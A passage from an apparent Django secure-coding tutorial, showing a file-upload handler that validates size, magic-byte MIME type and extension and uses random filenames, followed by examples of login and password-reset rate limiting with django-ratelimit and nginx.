def handle_upload(request):
    uploaded_file = request.FILES.get('file')
    if not uploaded_file:
        return JsonResponse({"error": "No file provided"}, status=400)

    # 1. Check file size
    if uploaded_file.size > MAX_FILE_SIZE:
        return JsonResponse({"error": "File too large"}, status=400)

    # 2. Validate MIME type using magic bytes (not the file extension!)
    file_content = uploaded_file.read(2048)  # Read first 2KB for magic bytes
    uploaded_file.seek(0)  # Reset file pointer
    detected_type = magic.from_buffer(file_content, mime=True)
    if detected_type not in ALLOWED_MIME_TYPES:
        return JsonResponse({"error": f"File type {detected_type} not allowed"}, status=400)

    # 3. Generate a random filename (prevent path traversal and overwriting)
    extension = os.path.splitext(uploaded_file.name)[1].lower()
    if extension not in ['.jpg', '.jpeg', '.png', '.gif', '.webp', '.pdf']:
        return JsonResponse({"error": "Invalid file extension"}, status=400)
    safe_filename = f"{uuid.uuid4()}{extension}"

    # 4. Store outside the webroot
    storage_path = os.path.join(settings.MEDIA_ROOT, 'uploads', safe_filename)
    os.makedirs(os.path.dirname(storage_path), exist_ok=True)
    with open(storage_path, 'wb') as dest:
        for chunk in uploaded_file.chunks():
            dest.write(chunk)

    # 5. Serve from a separate domain or CDN (prevents cookie leakage)
    file_url = f"https://cdn.example.com/uploads/{safe_filename}"
    return JsonResponse({"url": file_url})
```

#### Rate Limiting

Rate limiting is essential for protecting authentication endpoints, password reset flows, and API endpoints from brute-force attacks and abuse.

```python
# Using django-ratelimit
# pip install django-ratelimit

from django_ratelimit.decorators import ratelimit

@ratelimit(key='ip', rate='5/m', method='POST', block=True)
def login_view(request):
    """Allow only 5 login attempts per minute per IP address."""
    # ... authentication logic ...
    pass

@ratelimit(key='ip', rate='3/h', method='POST', block=True)
def password_reset_view(request):
    """Allow only 3 password reset requests per hour per IP."""
    # ... password reset logic ...
    pass

# Combine IP-based and account-based rate limiting
@ratelimit(key='ip', rate='10/m', method='POST', block=True)
@ratelimit(key='post:username', rate='5/m', method='POST', block=True)
def login_view(request):
    """Rate limit by both IP and username."""
    pass


# Nginx-level rate limiting (applied before requests reach your application):
# nginx.conf
# http {
#     limit_req_zone $binary_remote_addr zone=login:10m rate=5r/m;
#     limit_req_zone $binary_remote_addr zone=api:10m rate=30r/m;
#
#     server {
#         location /api/login/ {
#             limit_req zone=login burst=3 nodelay;
#             proxy_pass http://127.0.0.1:8000;
#         }
#         location /api/ {
#             limit_req zone=api burst=20 nodelay;
#             proxy_pass http://127.0.0.1:8000;
#         }
#     }
# }
```

> **Key Takeaway:** Defense in depth means applying multiple layers of security. Validate input with allowlists, use parameterized queries for all database access, set comprehensive security headers at both the application and web server level, configure CORS with specific origins, validate file uploads by content rather than extension, and rate-limit sensitive endpoints.
